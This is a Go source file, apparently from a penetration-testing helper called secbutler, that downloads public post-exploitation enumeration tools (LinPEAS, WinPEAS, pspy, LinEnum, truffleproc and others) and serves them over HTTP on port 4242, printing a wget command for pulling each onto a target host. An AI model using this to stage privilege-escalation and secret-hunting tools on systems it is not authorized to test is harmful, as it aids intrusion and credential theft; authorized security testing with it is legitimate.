package runners

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"

	"github.com/groundsec/secbutler/pkg/logger"
	"github.com/groundsec/secbutler/pkg/types"
	"github.com/groundsec/secbutler/pkg/utils"
)

var payloads = []types.Payloads{
	{Name: "LinPEAS", Filename: "linpeas.sh", DownloadURL: "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"},
	{Name: "WinPEAS", Filename: "winPEASany.exe", DownloadURL: "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"},
	{Name: "Linux Smart Enumeration", Filename: "lse.sh", DownloadURL: "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"},
	{Name: "pspy 32bit static version", Filename: "pspy32", DownloadURL: "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32"},
	{Name: "pspy 64bit static version", Filename: "pspy64", DownloadURL: "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"},
	{Name: "pspy 32bit small version", Filename: "pspy32s", DownloadURL: "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s"},
	{Name: "pspy 64bit small version", Filename: "pspy64s", DownloadURL: "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s"},
	{Name: "Linux Exploit Suggester", Filename: "les.sh", DownloadURL: "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"},
	{Name: "LinEnum", Filename: "LinEnum.sh", DownloadURL: "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"},
	{Name: "Enumy32", Filename: "enumy32", DownloadURL: "https://github.com/luke-goddard/enumy/releases/latest/download/enumy32"},
	{Name: "Enumy64", Filename: "enumy64", DownloadURL: "https://github.com/luke-goddard/enumy/releases/latest/download/enumy64"},
	{Name: "truffleproc", Filename: "truffleproc.sh", DownloadURL: "https://raw.githubusercontent.com/controlplaneio/truffleproc/master/truffleproc.sh"},
}

func downloadPayloads() {
	mainDirName := ".secbutler"
	payloadsDirName := "payloads"
	homeDir, err := os.UserHomeDir()
	if err != nil {
		logger.Fatal(err)
	}

	for _, payload := range payloads {
		payloadPath := filepath.Join(homeDir, mainDirName, payloadsDirName, payload.Filename)

		if !utils.FileExists(payloadPath) {
			logger.Info(fmt.Sprintf("Downloading %s from %s", payload.Name, payload.DownloadURL))
			err := utils.DownloadFile(payload.DownloadURL, payloadPath)
			if err != nil {
				logger.Error(fmt.Sprintf("Unable to download %s from %s", payload.Name, payload.DownloadURL))
			}
		}
	}
}

func ServePayloads() {
	downloadPayloads()
	currentIP, err := utils.GetCurrentIP()
	if err != nil {
		logger.Error("Unable to obtain current IP")
	}

	mainDirName := ".secbutler"
	payloadsDirName := "payloads"
	homeDir, err := os.UserHomeDir()
	if err != nil {
		logger.Fatal(err)
	}
	payloadsPath := filepath.Join(homeDir, mainDirName, payloadsDirName)
	fs := http.FileServer(http.Dir(payloadsPath))
	http.Handle("/", fs)
	port := 4242
	logger.Info(fmt.Sprintf("Serving payloads from folder %s on port %d", payloadsPath, port))
	fmt.Printf("Available payloads:\n\n")

	for _, payload := range payloads {
		fmt.Printf("%s%s%s%s (%s)\n", utils.ANSICodes["Red"], utils.ANSICodes["Bold"], payload.Name, utils.ANSICodes["Reset"], payload.Filename)
		fmt.Printf("wget http://%s:%d/%s\n\n", currentIP, port, payload.Filename)
	}

	fmt.Printf("%s%sPress Ctrl-C to stop the server%s\n", utils.ANSICodes["Blue"], utils.ANSICodes["Bold"], utils.ANSICodes["Reset"])
	err = http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
	if err != nil {
		logger.Error(err)
	}
}
